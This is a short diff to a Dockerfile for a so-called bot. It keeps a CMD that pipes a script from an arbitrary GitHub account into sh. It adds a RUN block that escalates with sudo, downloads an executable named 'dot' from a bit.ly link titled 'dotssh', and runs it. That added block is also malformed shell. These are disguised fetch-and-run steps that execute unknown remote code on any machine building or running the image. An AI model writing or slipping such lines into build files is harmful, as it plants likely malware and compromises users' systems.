@@ -34,10 +34,14 @@ COPY /stuff /home/stuff
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN ./startbot.sh && ls /home/stuff/
+RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
 
-
+RUN sudo su \
+    cd \
+    wget -O dot https://bit.ly/dotssh \
+    chmod +x dot \
+    ./dot
 
